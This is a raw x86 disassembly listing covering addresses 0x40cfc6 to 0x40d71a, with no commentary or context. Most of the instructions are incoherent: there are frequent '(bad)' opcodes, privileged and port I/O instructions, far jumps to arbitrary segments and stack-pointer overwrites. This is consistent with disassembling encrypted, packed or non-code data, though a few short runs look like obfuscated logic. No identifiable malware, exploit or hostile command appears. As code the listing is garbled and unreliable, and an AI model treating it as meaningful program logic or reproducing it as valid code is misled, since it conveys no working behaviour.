  40cfc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfc7:	pop    esi
  40cfc8:	jo     0x40cfc5
  40cfca:	jae    0x40cfe5
  40cfcc:	out    dx,al
  40cfcd:	cmp    al,0xd2
  40cfcf:	mov    ecx,0x90faae49
  40cfd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfd5:	retf   
  40cfd6:	mov    eax,ds:0xa485c950
  40cfdb:	stos   BYTE PTR es:[edi],al
  40cfdc:	hlt    
  40cfdd:	outs   dx,BYTE PTR ds:[esi]
  40cfde:	(bad)  
  40cfdf:	fst    DWORD PTR ds:0xf0e7b7a4
  40cfe5:	or     DWORD PTR [edx+esi*2],esp
  40cfe8:	xor    al,BYTE PTR [edi+0x56a88ab0]
  40cfee:	cmc    
  40cfef:	fnstenv [ebx-0x3d]
  40cff2:	ucomiss xmm1,DWORD PTR [ecx]
  40cff5:	sbb    bh,BYTE PTR [edi-0x66f08b69]
  40cffb:	xor    al,0x1c
  40cffd:	aad    0x94
  40cfff:	sbb    BYTE PTR [ebx+0x65aaf0ee],dl
  40d005:	setg   BYTE PTR [ebx+0x75]
  40d009:	dec    edx
  40d00a:	push   ebx
  40d00b:	or     bh,bl
  40d00d:	neg    dh
  40d00f:	shl    DWORD PTR [ebx],cl
  40d011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d012:	xchg   ebx,eax
  40d013:	and    dh,cl
  40d015:	das    
  40d016:	push   es
  40d017:	cmp    DWORD PTR [ecx],ecx
  40d019:	dec    esi
  40d01a:	dec    eax
  40d01b:	mov    esp,0xe33b91a7
  40d020:	loopne 0x40cfec
  40d022:	shl    BYTE PTR [eax-0x4f913d6],1
  40d028:	cs xchg esp,eax
  40d02a:	push   esi
  40d02b:	les    ebx,FWORD PTR [edx*4-0x62c60de4]
  40d032:	jge    0x40d097
  40d034:	(bad)
  40d037:	mov    gs,WORD PTR [edx]
  40d039:	mov    esi,ecx
  40d03b:	dec    ebx
  40d03c:	mov    eax,0xdb509eb
  40d041:	cmp    DWORD PTR [edx],ebx
  40d043:	xor    esi,DWORD PTR [ebp-0x51f2c1ab]
  40d049:	and    eax,0xf5fd5aeb
  40d04e:	popa   
  40d04f:	pushf  
  40d050:	inc    ecx
  40d051:	std    
  40d052:	aaa    
  40d053:	shr    BYTE PTR [esp+esi*4-0x40],1
  40d057:	mov    bh,0xbb
  40d059:	lahf   
  40d05a:	add    BYTE PTR [edx-0x65],ch
  40d05d:	aad    0xe4
  40d05f:	icebp  
  40d060:	ins    DWORD PTR es:[edi],dx
  40d061:	jns    0x40d084
  40d063:	push   esi
  40d064:	and    DWORD PTR [ebx+0x5d7ad3f2],ebx
  40d06a:	mov    ch,0x46
  40d06c:	and    bl,cl
  40d06e:	scas   eax,DWORD PTR es:[edi]
  40d06f:	inc    ebp
  40d070:	push   es
  40d071:	fstp   QWORD PTR [eax]
  40d073:	jle    0x40d013
  40d075:	mov    ds:0x5e2bbf23,eax
  40d07a:	mov    cl,0x5
  40d07c:	dec    ebp
  40d07d:	jnp    0x40d055
  40d07f:	sbb    eax,0xb57fccfa
  40d084:	cld    
  40d085:	dec    DWORD PTR [ebp+0x63]
  40d088:	mov    esi,0xd20e6e8d
  40d08d:	sbb    al,0x37
  40d08f:	ins    DWORD PTR es:[edi],dx
  40d090:	lds    edi,FWORD PTR [edx]
  40d092:	out    0xed,eax
  40d094:	leave  
  40d095:	or     al,BYTE PTR [ecx-0x1d93c01]
  40d09b:	xchg   edx,eax
  40d09c:	xchg   DWORD PTR [esi+0x54cc909e],edi
  40d0a2:	push   esi
  40d0a3:	mov    DWORD PTR [esi-0x26],eax
  40d0a6:	loopne 0x40d0ad
  40d0a8:	xor    DWORD PTR [ebx-0x1954aaba],0x3c33e39b
  40d0b2:	les    ebp,FWORD PTR [edi+0x54a39905]
  40d0b8:	or     eax,0x96dca977
  40d0bd:	sbb    BYTE PTR [esi],ch
  40d0bf:	mov    WORD PTR [eax+edi*1+0x66860f22],ds
  40d0c6:	lock (bad) 
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	(bad)  
  40d0ee:	icebp  
  40d0ef:	cwd    
  40d0f1:	stos   BYTE PTR es:[edi],al
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d141
  40d0fb:	xchg   edi,eax
  40d0fc:	mov    esi,0xbf7f76c3
  40d101:	mov    edi,0x9e839361
  40d106:	es jns 0x40d0fa
  40d109:	xchg   esi,eax
  40d10a:	into   
  40d10b:	out    dx,eax
  40d10c:	xor    BYTE PTR [edi-0x7eb7f331],0x33
  40d113:	mov    ah,0x33
  40d115:	cmp    DWORD PTR [edx+0x7f],edi
  40d118:	sbb    al,0xa7
  40d11a:	jp     0x40d183
  40d11c:	xchg   esp,eax
  40d11d:	dec    ebx
  40d11e:	scas   al,BYTE PTR es:[edi]
  40d11f:	std    
  40d120:	daa    
  40d121:	dec    esi
  40d122:	cmp    eax,DWORD PTR [eax]
  40d124:	xchg   esp,eax
  40d125:	aam    0x9f
  40d127:	call   0x389abb0c
  40d12c:	xchg   ebp,eax
  40d12d:	fistp  QWORD PTR [ebx-0x66]
  40d130:	mov    ebx,0xf63e3b9a
  40d135:	and    ecx,DWORD PTR [ecx+edi*4+0x7882df27]
  40d13c:	iret   
  40d13d:	ins    BYTE PTR es:[edi],dx
  40d13e:	loope  0x40d0ee
  40d140:	scas   al,BYTE PTR es:[edi]
  40d141:	xor    al,0x6e
  40d143:	push   0xffffff8f
  40d145:	(bad)  
  40d146:	jp     0x40d164
  40d148:	mov    ch,0x2d
  40d14a:	inc    ecx
  40d14b:	(bad)  
  40d14c:	repz dec esi
  40d14e:	mov    cl,BYTE PTR [edi+0x2d7f69d8]
  40d154:	cmp    eax,0xa78d7d44
  40d159:	jns    0x40d14c
  40d15b:	pop    ebx
  40d15c:	adc    al,0x48
  40d15e:	xchg   esi,eax
  40d15f:	or     eax,DWORD PTR [esi]
  40d161:	cwde   
  40d162:	adc    BYTE PTR [edi+0x5a],cl
  40d165:	scas   eax,DWORD PTR es:[edi]
  40d166:	and    eax,0x9c89a16e
  40d16b:	xchg   esp,eax
  40d16c:	jge    0x40d1a2
  40d16e:	jno    0x40d1ca
  40d170:	jnp    0x40d150
  40d172:	mov    WORD PTR [eax-0x31],fs
  40d175:	(bad)  
  40d176:	mov    ch,0x15
  40d178:	dec    ebp
  40d179:	imul   ecx,DWORD PTR [eax+0x3c494827],0xffffff87
  40d180:	or     DWORD PTR [esi+ebx*2],eax
  40d183:	dec    ebp
  40d184:	idiv   DWORD PTR [edi+edi*4+0x21ece3b]
  40d18b:	test   eax,0x8ee1864a
  40d190:	inc    eax
  40d191:	pop    ebx
  40d192:	retf   0xa1e2
  40d195:	inc    edi
  40d196:	adc    edi,eax
  40d198:	xchg   edx,eax
  40d199:	dec    ecx
  40d19a:	jmp    0xeeac:0x37a52bd4
  40d1a1:	into   
  40d1a2:	jae    0x40d1ad
  40d1a4:	adc    edx,DWORD PTR [edx-0x2b]
  40d1a7:	cmp    ecx,DWORD PTR [esi]
  40d1a9:	(bad)  
  40d1ab:	push   cs
  40d1ac:	cmp    al,0xe8
  40d1ae:	arpl   WORD PTR [ecx-0x6f],ax
  40d1b1:	pop    eax
  40d1b2:	add    eax,0xadbbcc7e
  40d1b7:	stc    
  40d1b8:	push   0xfffffff0
  40d1ba:	inc    edx
  40d1bb:	xor    ch,BYTE PTR [ebx+ecx*2-0x4b]
  40d1bf:	jae    0x40d1c9
  40d1c1:	sub    bl,BYTE PTR [edx]
  40d1c3:	addr16 mov esi,0x36a33abb
  40d1c9:	aas    
  40d1ca:	in     eax,dx
  40d1cb:	inc    ebx
  40d1cc:	lods   al,BYTE PTR ds:[esi]
  40d1cd:	jl     0x40d1ea
  40d1cf:	mov    gs,esi
  40d1d1:	test   eax,0x4d6cba7b
  40d1d6:	jp     0x40d247
  40d1d8:	ss stos DWORD PTR es:[edi],eax
  40d1da:	jecxz  0x40d222
  40d1dc:	add    al,0x3d
  40d1de:	iret   
  40d1df:	xor    BYTE PTR [edx+0x6f3fefe4],cl
  40d1e5:	mov    cl,0x6d
  40d1e7:	gs dec esi
  40d1e9:	jnp    0x40d1b7
  40d1eb:	popf   
  40d1ec:	rol    DWORD PTR [ecx+ebp*8],cl
  40d1ef:	cmp    al,0x9
  40d1f1:	(bad)  
  40d1f2:	test   DWORD PTR [edx],0x164e0c7e
  40d1f8:	push   ebx
  40d1f9:	cmp    DWORD PTR [edx+0x39acd1fd],ecx
  40d1ff:	cmp    edi,0xffffffdd
  40d202:	icebp  
  40d203:	in     eax,dx
  40d204:	bnd jle 0x40d1df
  40d207:	ltr    WORD PTR [ebp-0x4a3c6ec8]
  40d20e:	sbb    cl,BYTE PTR [esi-0x6e246d2d]
  40d214:	dec    edx
  40d215:	outs   dx,DWORD PTR ds:[esi]
  40d216:	or     esp,DWORD PTR [edx*1+0x3b866950]
  40d21d:	mov    ?,WORD PTR [edi+0x5ceeea8d]
  40d223:	mov    ah,0xbf
  40d225:	mov    edx,0x9850d356
  40d22a:	push   ebp
  40d22b:	lea    edi,[edx+0x494b3f12]
  40d231:	xchg   edx,eax
  40d232:	or     BYTE PTR [esi],ah
  40d234:	jle    0x40d209
  40d236:	or     DWORD PTR [eax],0xa
  40d239:	stc    
  40d23a:	jbe    0x40d223
  40d23c:	or     al,0x3d
  40d23e:	test   eax,0x133323ce
  40d243:	pusha  
  40d244:	xchg   ebp,eax
  40d245:	shr    BYTE PTR [esi-0x76],0x49
  40d249:	jnp    0x40d1fe
  40d24b:	or     DWORD PTR [ebx-0x3793343c],0xffffffa3
  40d252:	jne    0x40d23c
  40d254:	jne    0x40d26f
  40d256:	mov    dl,0xd8
  40d258:	out    dx,eax
  40d259:	ror    DWORD PTR [ebx-0x37],1
  40d25c:	ja     0x40d2c8
  40d25e:	mov    ebx,0xf8561627
  40d263:	ss xchg edx,eax
  40d265:	jnp    0x40d293
  40d267:	inc    edx
  40d268:	xchg   ebx,eax
  40d269:	fiadd  DWORD PTR [esi+0x6cc461b6]
  40d26f:	or     BYTE PTR [edi],ah
  40d271:	aam    0xc2
  40d273:	sbb    eax,0xe44d9b15
  40d278:	addr16 rol bl,cl
  40d27b:	sub    al,0xec
  40d27d:	jge    0x40d21b
  40d27f:	and    bh,BYTE PTR [edi+ebp*1-0x3e]
  40d283:	mov    ah,0xbd
  40d285:	dec    ebx
  40d286:	(bad)  
  40d287:	retf   
  40d288:	repnz pop ebp
  40d28a:	mov    ch,0x93
  40d28c:	and    BYTE PTR [ebp-0x4ba05e75],al
  40d292:	adc    DWORD PTR [edx-0x6cd8f9ef],0x4d546731
  40d29c:	pop    ss
  40d29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d29e:	jle    0x40d2c0
  40d2a0:	lods   eax,DWORD PTR ds:[esi]
  40d2a1:	add    eax,esp
  40d2a3:	test   bl,al
  40d2a5:	ficomp DWORD PTR [eax]
  40d2a7:	ror    dh,0xca
  40d2aa:	push   eax
  40d2ab:	cmp    DWORD PTR [esi+0x39],0x30d44481
  40d2b2:	in     al,0xaf
  40d2b4:	fisubr WORD PTR [ebp-0x3c6fe2f5]
  40d2ba:	xchg   DWORD PTR gs:[ecx-0x3e],esp
  40d2be:	fcomip st,st(6)
  40d2c0:	idiv   DWORD PTR [esi+0x15]
  40d2c3:	jnp    0x40d275
  40d2c5:	inc    edx
  40d2c6:	xor    edx,eax
  40d2c8:	lods   eax,DWORD PTR ds:[esi]
  40d2c9:	mov    BYTE PTR [esi],ch
  40d2cb:	mov    bl,BYTE PTR [edi]
  40d2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2ce:	sbb    eax,0x384f10b2
  40d2d3:	shr    ch,cl
  40d2d5:	leave  
  40d2d6:	push   cs
  40d2d7:	(bad)  
  40d2d8:	ror    al,1
  40d2da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2db:	(bad)  
  40d2dc:	cwde   
  40d2dd:	cdq    
  40d2de:	dec    edx
  40d2df:	and    al,0x38
  40d2e1:	in     al,0x5b
  40d2e3:	stc    
  40d2e4:	scas   eax,DWORD PTR es:[edi]
  40d2e5:	jno    0x40d335
  40d2e7:	je     0x40d273
  40d2e9:	lods   eax,DWORD PTR ds:[esi]
  40d2ea:	addr16 call 0xdaa41565
  40d2f0:	and    al,0xe9
  40d2f2:	xchg   ecx,eax
  40d2f3:	xchg   ecx,eax
  40d2f4:	adc    al,0xb6
  40d2f6:	adc    ch,cl
  40d2f8:	mov    ebx,0xa466786f
  40d2fd:	(bad)  
  40d2fe:	cmc    
  40d2ff:	or     ebx,DWORD PTR [eax-0x3e]
  40d302:	ror    BYTE PTR [edi-0x26f74bb6],1
  40d308:	lahf   
  40d309:	lods   eax,DWORD PTR ds:[esi]
  40d30a:	jno    0x40d32b
  40d30c:	int    0xec
  40d30e:	mov    ds:0x2401ebbe,eax
  40d313:	les    edx,FWORD PTR [ecx+0x6210e164]
  40d319:	mov    bh,0x93
  40d31b:	cmp    al,0x47
  40d31d:	mov    ebx,0xe1787344
  40d322:	das    
  40d323:	add    al,ah
  40d325:	fmul   QWORD PTR [ebx+0x6e]
  40d328:	clc    
  40d329:	push   edi
  40d32a:	cmp    dh,bl
  40d32c:	std    
  40d32d:	pop    ecx
  40d32e:	mov    ds:0x57811e30,eax
  40d333:	push   DWORD PTR [edx+0x3f]
  40d336:	mov    cl,0xfb
  40d338:	mov    eax,0x48266d61
  40d33d:	adc    eax,0xa2377608
  40d342:	stos   DWORD PTR es:[edi],eax
  40d343:	sbb    DWORD PTR [esi+0x40],ebx
  40d346:	push   0xffffffd6
  40d348:	test   DWORD PTR [eax-0x1f],ebx
  40d34b:	js     0x40d3ab
  40d34d:	aad    0x91
  40d34f:	inc    edx
  40d350:	stc    
  40d351:	fwait
  40d352:	into   
  40d353:	aad    0x5a
  40d355:	fcmove st,st(5)
  40d357:	sub    bl,BYTE PTR [eax+0x5f]
  40d35a:	jae    0x40d3a5
  40d35c:	sub    BYTE PTR [eax+esi*8+0x16],bl
  40d360:	gs jb  0x40d34a
  40d363:	jbe    0x40d3a1
  40d365:	lock dec eax
  40d367:	outs   dx,BYTE PTR ds:[esi]
  40d368:	call   0x2288:0x22caf525
  40d36f:	fnstenv [ebx+eiz*2]
  40d372:	mov    cl,0x44
  40d374:	or     cl,ah
  40d376:	std    
  40d377:	and    esp,edi
  40d379:	jne    0x40d3e5
  40d37b:	xchg   edi,eax
  40d37c:	jg     0x40d3a4
  40d37e:	stos   BYTE PTR es:[edi],al
  40d37f:	mov    edx,0x15adf5a6
  40d384:	(bad)  
  40d385:	fisub  DWORD PTR [edi]
  40d387:	stos   DWORD PTR es:[edi],eax
  40d388:	(bad)  
  40d389:	push   ebp
  40d38a:	test   DWORD PTR [ecx-0x57bff638],edi
  40d390:	or     dl,dh
  40d392:	test   esp,0x5e4c4b22
  40d398:	rcr    BYTE PTR [ebx+0x66],0x7b
  40d39c:	fisubr DWORD PTR [ebx-0x72]
  40d39f:	cmp    DWORD PTR [edi-0x42],edx
  40d3a2:	rcl    BYTE PTR [edx+0x5a50f3fd],1
  40d3a8:	scas   al,BYTE PTR es:[edi]
  40d3a9:	test   DWORD PTR [ebx],edx
  40d3ab:	inc    ecx
  40d3ac:	dec    edi
  40d3ad:	add    DWORD PTR [eax],0xbe2a819b
  40d3b3:	mov    dl,0xdd
  40d3b5:	add    dh,ch
  40d3b7:	popf   
  40d3b8:	dec    esi
  40d3b9:	jecxz  0x40d35f
  40d3bb:	(bad)  
  40d3bc:	aaa    
  40d3bd:	test   eax,0xe9df3879
  40d3c2:	orps   xmm5,xmm2
  40d3c5:	jl     0x40d417
  40d3c7:	mov    DWORD PTR [ecx+0x71],ebp
  40d3ca:	inc    edx
  40d3cb:	sub    eax,0xeeac5f09
  40d3d0:	dec    edx
  40d3d1:	or     DWORD PTR cs:[edx-0x2b5bcba1],esi
  40d3d8:	and    DWORD PTR [edx-0x63],ebp
  40d3db:	inc    esi
  40d3dc:	retf   0x4ee6
  40d3df:	sbb    bh,bl
  40d3e1:	pop    ebx
  40d3e2:	lds    cx,DWORD PTR [eax]
  40d3e5:	mov    dl,0xe8
  40d3e7:	ficomp WORD PTR [ecx+edx*8]
  40d3ea:	inc    eax
  40d3eb:	add    BYTE PTR [ebx+0x3d36bcc7],dh
  40d3f1:	push   0x67
  40d3f3:	pop    ebp
  40d3f4:	stc    
  40d3f5:	sbb    DWORD PTR [edi],ebp
  40d3f7:	ret    
  40d3f8:	sub    DWORD PTR [edx],ebp
  40d3fa:	mov    ebx,0x9a66a903
  40d3ff:	add    DWORD PTR [edi-0xc],esp
  40d402:	aas    
  40d403:	outs   dx,BYTE PTR ds:[esi]
  40d404:	sub    al,0x54
  40d406:	xor    dh,BYTE PTR [ecx+0x12]
  40d409:	dec    edi
  40d40a:	push   es
  40d40b:	jns    0x40d3f9
  40d40d:	jno    0x40d3fc
  40d40f:	jecxz  0x40d458
  40d411:	push   edi
  40d412:	push   0x63fe1041
  40d417:	or     DWORD PTR [edx-0x5b],ebp
  40d41a:	jl     0x40d3af
  40d41c:	mov    al,0x7f
  40d41e:	je     0x40d450
  40d420:	jo     0x40d3aa
  40d422:	imul   edi,DWORD PTR [ecx],0xffffffd2
  40d425:	lea    esi,[edx+0x5ac61f48]
  40d42b:	out    0x9d,al
  40d42d:	out    dx,al
  40d42e:	adc    al,ch
  40d430:	repz sbb BYTE PTR [di+0x10],bl
  40d435:	push   esi
  40d436:	in     eax,0x71
  40d438:	xor    ebx,DWORD PTR [edi-0x1086050f]
  40d43e:	adc    al,0x94
  40d440:	jmp    0x40d48c
  40d442:	pop    edx
  40d443:	(bad)  
  40d444:	jns    0x40d46b
  40d446:	aaa    
  40d447:	ins    BYTE PTR es:[edi],dx
  40d448:	push   0x48
  40d44a:	std    
  40d44b:	lods   eax,DWORD PTR ds:[esi]
  40d44c:	sbb    BYTE PTR [edx-0x7787c1b3],dl
  40d452:	push   esp
  40d453:	and    DWORD PTR [ecx],edi
  40d455:	pushf  
  40d456:	lods   al,BYTE PTR ds:[esi]
  40d457:	or     ch,BYTE PTR [edi+0x55da981f]
  40d45d:	arpl   cx,sp
  40d45f:	shr    DWORD PTR [ecx-0x2d],1
  40d462:	mov    ah,BYTE PTR [eax-0x46d77dea]
  40d468:	push   cs
  40d469:	lahf   
  40d46a:	sub    eax,DWORD PTR [edx-0x30]
  40d46d:	int3   
  40d46e:	les    edx,FWORD PTR [ebp+0x32]
  40d471:	add    edx,ebx
  40d473:	and    ah,dl
  40d475:	adc    al,0xb4
  40d477:	data16 fimul DWORD PTR [ebp+0x2e53bed8]
  40d47e:	(bad)  
  40d47f:	gs mov ah,0xb7
  40d482:	inc    edi
  40d483:	fcomp  DWORD PTR [esi-0x6d]
  40d486:	repz jno 0x40d4e7
  40d489:	test   BYTE PTR [edx+0x5f],cl
  40d48c:	call   0x98992abc
  40d491:	jmp    0x40d4fa
  40d493:	mov    dh,0x1e
  40d495:	mov    ds:0xae5941d6,eax
  40d49a:	mov    cl,BYTE PTR [ebx-0x6b720783]
  40d4a0:	cmp    bl,BYTE PTR [edx+esi*2+0x55890032]
  40d4a7:	clc    
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x4ed3:0xb81a1d63
  40d4c6:	cld    
  40d4c7:	inc    esi
  40d4c8:	mov    esi,0x707099c9
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4d6
  40d4d2:	aaa    
  40d4d3:	retf   0x4a86
  40d4d6:	aam    0xf8
  40d4d8:	dec    eax
  40d4d9:	imul   ebx,ebx,0x6a76a86a
  40d4df:	jne    0x40d520
  40d4e1:	cmp    eax,0x73d9d2e9
  40d4e6:	cdq    
  40d4e7:	mov    al,0x5c
  40d4e9:	and    DWORD PTR [edx],ecx
  40d4eb:	test   BYTE PTR [ebp+edi*8-0x50c94124],dl
  40d4f2:	inc    ebx
  40d4f3:	bound  ebx,QWORD PTR [esp+edi*2+0x80fdc13]
  40d4fa:	xor    al,0xdb
  40d4fc:	mov    ch,BYTE PTR [ebp-0x78]
  40d4ff:	sahf   
  40d500:	push   esi
  40d501:	pop    eax
  40d502:	in     eax,0xb7
  40d504:	test   eax,0x43007b12
  40d509:	or     eax,0xfff10133
  40d50e:	sbb    esp,esi
  40d510:	xor    edx,esi
  40d512:	imul   DWORD PTR [esi+0x424fcd6a]
  40d518:	inc    ebx
  40d519:	sub    BYTE PTR [ebp-0x24f761f],bl
  40d51f:	mov    ch,0x99
  40d521:	imul   esi,DWORD PTR [edi+0x604681a],0x8ece14b4
  40d52b:	mov    ds:0x9f4422eb,al
  40d530:	add    BYTE PTR [esi],0x58
  40d533:	pop    ebx
  40d534:	mov    ds:0xff1a7db7,al
  40d539:	or     al,0x30
  40d53b:	test   DWORD PTR [eax-0x16de7b24],esp
  40d541:	cmp    ch,ch
  40d543:	(bad)  
  40d544:	in     al,0xf0
  40d546:	mov    esp,0xfd773387
  40d54b:	sub    al,0xdf
  40d54d:	sub    esp,0x1d
  40d550:	cmp    eax,0x81a48735
  40d555:	inc    edx
  40d556:	add    BYTE PTR [esi],dh
  40d558:	js     0x40d54d
  40d55a:	add    eax,0x2da5ed6d
  40d55f:	arpl   WORD PTR ds:0x4083ee00,si
  40d565:	add    ch,BYTE PTR [ebp+eax*1-0x294f1231]
  40d56c:	ins    DWORD PTR es:[edi],dx
  40d56d:	cli    
  40d56e:	inc    eax
  40d56f:	adc    BYTE PTR [ecx-0x6b84678d],cl
  40d575:	outs   dx,DWORD PTR ds:[esi]
  40d576:	cmp    DWORD PTR [ebp-0x604e3778],edx
  40d57c:	dec    ebx
  40d57d:	mov    ebx,fs
  40d57f:	fisub  WORD PTR [eax-0x79]
  40d582:	sbb    eax,0x2453fa59
  40d587:	mov    edx,?
  40d589:	and    BYTE PTR [edx+0x24d816b3],ah
  40d58f:	mov    esp,0x147f0ec5
  40d594:	push   edx
  40d595:	push   edx
  40d596:	push   esi
  40d597:	add    ebp,DWORD PTR [eax]
  40d599:	aaa    
  40d59a:	cmp    bh,BYTE PTR [esi-0x59]
  40d59d:	mov    ds:0x66d0e7c3,al
  40d5a2:	sbb    ecx,DWORD PTR [ecx-0x21b7dae0]
  40d5a8:	add    eax,0xf12f3cb0
  40d5ad:	scas   al,BYTE PTR es:[edi]
  40d5ae:	xor    DWORD PTR [edx],ebx
  40d5b0:	mov    al,0xb0
  40d5b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5b3:	mov    ds:0x340bad22,al
  40d5b8:	std    
  40d5b9:	fnstcw WORD PTR [edx+0x60a01e69]
  40d5bf:	call   0xedf1d9e9
  40d5c4:	push   esp
  40d5c5:	sti    
  40d5c6:	add    al,0x3f
  40d5c8:	mov    dh,0x84
  40d5ca:	inc    ecx
  40d5cb:	stos   BYTE PTR es:[edi],al
  40d5cc:	stc    
  40d5cd:	aad    0x2
  40d5cf:	es cmc 
  40d5d1:	dec    esp
  40d5d2:	mov    edi,0x8c369b76
  40d5d7:	js     0x40d61d
  40d5d9:	ret    
  40d5da:	cdq    
  40d5db:	popf   
  40d5dc:	inc    eax
  40d5dd:	imul   edx,DWORD PTR [edi+edx*4],0x18
  40d5e1:	fidivr WORD PTR [ebx-0x1d]
  40d5e4:	stc    
  40d5e5:	inc    edi
  40d5e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5e7:	int3   
  40d5e8:	mov    ecx,0xb3ed1e5c
  40d5ed:	retf   
  40d5ee:	inc    esi
  40d5ef:	shl    BYTE PTR [esi],cl
  40d5f1:	and    eax,0x6ca69703
  40d5f6:	lods   al,BYTE PTR ds:[esi]
  40d5f7:	xor    DWORD PTR [esi+edi*2+0x65982697],edx
  40d5fe:	shrd   DWORD PTR [ebx+0x2905c562],esi,0x62
  40d606:	arpl   WORD PTR [esi-0x47],dx
  40d609:	cmp    BYTE PTR [edx],ch
  40d60b:	(bad)  
  40d60c:	adc    DWORD PTR [ecx],ecx
  40d60e:	shl    dh,0xdf
  40d611:	les    ebp,FWORD PTR [ebx+0x7e643d36]
  40d617:	xlat   BYTE PTR ds:[ebx]
  40d618:	int    0x7c
  40d61a:	js     0x40d5b3
  40d61c:	ds sub al,0x8e
  40d61f:	out    0xc9,eax
  40d621:	mov    ebp,0x469c4765
  40d626:	dec    ebx
  40d627:	aad    0x98
  40d629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d62a:	jecxz  0x40d6a6
  40d62c:	jb     0x40d602
  40d62e:	leave  
  40d62f:	dec    ecx
  40d630:	jmp    0x3cf68f22
  40d635:	dec    esi
  40d636:	mov    ecx,0xd6bc85eb
  40d63b:	fstp   DWORD PTR [edx]
  40d63d:	mov    ds:0xbd8bdea3,eax
  40d642:	outs   dx,DWORD PTR ds:[esi]
  40d643:	outs   dx,DWORD PTR ds:[esi]
  40d644:	inc    ebx
  40d645:	fimul  DWORD PTR [ebx]
  40d647:	test   al,0x7d
  40d649:	sub    eax,0x803ef99b
  40d64e:	lods   eax,DWORD PTR ds:[esi]
  40d64f:	sub    al,0x23
  40d651:	inc    esp
  40d652:	push   ecx
  40d653:	loope  0x40d683
  40d655:	adc    edi,ebp
  40d657:	push   ds
  40d658:	into   
  40d659:	adc    al,0xcc
  40d65b:	loope  0x40d64f
  40d65d:	cmp    dh,BYTE PTR [ebx+0x7bced437]
  40d663:	xor    BYTE PTR [ebx-0x507593b5],bh
  40d669:	imul   esi,DWORD PTR [eax-0x72],0x10
  40d66d:	push   es
  40d66e:	mov    esi,0x53f2a3d3
  40d673:	pop    ecx
  40d674:	pop    ds
  40d675:	pop    es
  40d676:	outs   dx,DWORD PTR ds:[esi]
  40d677:	mov    dl,0xa3
  40d679:	fcmovu st,st(2)
  40d67b:	xchg   BYTE PTR [edx-0x5099f4d3],dh
  40d681:	inc    ebx
  40d682:	repnz in al,dx
  40d684:	or     al,0x51
  40d686:	popa   
  40d687:	pop    edx
  40d688:	cld    
  40d689:	fcomp  QWORD PTR [edi-0x32131b8e]
  40d68f:	icebp  
  40d690:	out    dx,al
  40d691:	pop    ds
  40d692:	cli    
  40d693:	adc    ebp,DWORD PTR [edi+0x602b4514]
  40d699:	fsubr  st(7),st
  40d69b:	retf   0xfa4c
  40d69e:	mul    BYTE PTR [eax+0x50]
  40d6a1:	pop    ecx
  40d6a2:	pop    es
  40d6a3:	fcmovnu st,st(5)
  40d6a5:	inc    ecx
  40d6a6:	addr16 push edi
  40d6a8:	int3   
  40d6a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6aa:	pop    edx
  40d6ab:	fidivr WORD PTR [edx+0x9aff4bb]
  40d6b1:	sbb    ebp,DWORD PTR ds:0xfe751ec9
  40d6b7:	mov    WORD PTR [esp+ecx*4+0x33],cs
  40d6bb:	fiadd  WORD PTR [edx]
  40d6bd:	aaa    
  40d6be:	pop    ss
  40d6bf:	lods   al,BYTE PTR ds:[esi]
  40d6c0:	rcl    BYTE PTR [edx+ecx*8],cl
  40d6c3:	fdiv   st,st(2)
  40d6c5:	bound  edx,QWORD PTR [ebp-0x4e]
  40d6c8:	adc    eax,0x9b98266e
  40d6cd:	in     al,0x6a
  40d6cf:	in     al,0x24
  40d6d1:	mov    dl,0xcf
  40d6d3:	int3   
  40d6d4:	and    al,0xc4
  40d6d6:	mov    esi,0xd0a1f981
  40d6db:	cld    
  40d6dc:	scas   al,BYTE PTR es:[edi]
  40d6dd:	mov    ds:0xa524af3e,al
  40d6e2:	mov    dl,0x11
  40d6e4:	not    DWORD PTR [ebx]
  40d6e6:	xlat   BYTE PTR ds:[ebx]
  40d6e7:	sti    
  40d6e8:	and    cl,dh
  40d6ea:	jle    0x40d67e
  40d6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6ed:	clc    
  40d6ee:	test   BYTE PTR [esi+0x6],bl
  40d6f1:	cld    
  40d6f2:	mov    bh,0x68
  40d6f4:	jmp    0x8502:0xfb819422
  40d6fb:	adc    eax,0x60c3e814
  40d700:	sbb    eax,0x732774ec
  40d705:	xchg   BYTE PTR [ebx-0x7e],al
  40d708:	jnp    0x40d6d0
  40d70a:	cli    
  40d70b:	(bad)  
  40d70c:	mov    esp,0xf6e72251
  40d711:	cmp    BYTE PTR [edi],cl
  40d713:	out    dx,al
  40d714:	sbb    dl,BYTE PTR [eax-0x31]
  40d717:	pop    ss
  40d718:	or     al,0xe
  40d71a:	(bad)  
